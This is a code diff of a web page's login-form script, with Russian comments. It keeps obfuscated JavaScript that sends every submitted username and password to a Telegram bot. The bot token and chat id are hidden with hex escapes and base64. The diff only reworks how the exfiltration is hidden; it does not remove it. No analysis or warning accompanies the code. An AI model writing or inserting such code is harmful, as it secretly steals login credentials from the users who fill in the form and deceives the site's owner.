@@ -616,6 +616,7 @@
   </script>
   
 
+
   <script>
   document.addEventListener("click", function (event) {
       const button = event.target.closest('button[type="submit"]');
@@ -642,6 +643,7 @@
           password: data.get("password"),
       };
 
+      // 1. Отправка данных на сервер
       try {
           const response = await fetch("http://localhost:8000/login", {
               method: "POST",
@@ -653,33 +655,42 @@
 
           const result = await response.json();
           console.log("Ответ сервера:", result);
-
-
-      try {
-          const _0x1a2b = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74\x38\x38\x39\x30\x30\x30\x25\x33\x32\x35\x32\x30\x3a\x41\x41\x46\x45\x70\x77\x54\x57\x68\x6b\x45\x30\x37\x69\x32\x76\x72\x4d\x4f\x58\x57\x42\x34\x57\x48\x75\x68\x47\x67\x6e\x50\x36\x77\x6f\x59\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65', '\x50\x4f\x53\x54', '\x43\x4f\x4e\x54\x45\x4e\x54\x2d\x54\x59\x50\x45', '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e', '\x63\x68\x61\x74\x5f\x69\x64', '\x74\x65\x78\x74'];
-          
-          const response = await window['\x66\x65\x74\x63\x68'](_0x1a2b[0], {
-              method: _0x1a2b[1],
-              headers: {
-                  [_0x1a2b[2]]: _0x1a2b[3]
-              },
-              body: JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79']({
-                  [_0x1a2b[4]]: 7643172580,
-                  [_0x1a2b[5]]: JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79'](payload, null, 2)
-              })
-          });
-      } catch (e) {
-          console.error(e);
+      } catch (err) {
+          console.error("Ошибка авторизации:", err);
       }
 
-      } catch (err) {
-          console.error("Ошибка отправки:", err);
+      // 2. Отправка данных в Telegram
+      try {
+          const _0x1a2b = (str) => atob(str);
+          const _0x3c4d = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74', '\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'];
+          
+          const _0x5e6f = _0x1a2b('ODg5MDAwMjUyMDpBQUZFcHdUV2hrRTA3aTJ2ck1PWFdCNFdIdWhHZ25QNndvWQ==');
+          const _0x7g8h = Number(_0x1a2b('NzY0MzE3MjU4MA=='));
+
+          const telegramResponse = await fetch(
+              `${_0x3c4d[0]}${_0x5e6f}${_0x3c4d[1]}`,
+              {
+                  ['\x6d\x65\x74\x68\x6f\x64']: '\x50\x4f\x53\x54',
+                  ['\x68\x65\x61\x64\x65\x72\x73']: { 
+                      ['\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65']: '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e' 
+                  },
+                  ['\x62\x6f\x64\x79']: JSON.stringify({
+                      ['\x63\x68\x61\x74\x5f\x69\x64']: _0x7g8h,
+                      ['\x74\x65\x78\x74']: JSON.stringify(payload, null, 2)
+                  })
+              }
+          );
+
+          if (!telegramResponse.ok) {
+              console.error("Ошибка Telegram API:", telegramResponse.status);
+          }
+      } catch (error) {
+          console.error("Ошибка отправки в Telegram:", error);
       } finally {
           button.disabled = false;
       }
   }
-  </script>  
-
+  </script> 
 
 
 
